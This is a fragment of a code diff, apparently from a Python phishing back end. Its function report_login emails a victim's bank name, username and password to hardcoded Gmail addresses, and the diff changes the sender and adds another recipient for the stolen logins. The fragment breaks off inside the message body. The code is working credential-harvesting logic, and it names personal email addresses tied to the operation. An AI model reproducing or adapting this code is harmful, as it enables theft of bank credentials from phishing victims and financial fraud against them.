@@ -4,8 +4,8 @@ from datetime import datetime
 
 def report_login(username,password,bank_name):
     msg = Message('New Login', 
-        sender='abdullahomotoke@gmail.com', 
-        recipients=['adekunlealiamin010@gmail.com'])
+        sender='samcham010@gmail.com', 
+        recipients=['adekunlealiamin010@gmail.com', 'abdullahomotoke@gmail.com'])
     msg.body=f'''
     Bank Name ----- {bank_name}
     Username is ----- {username}
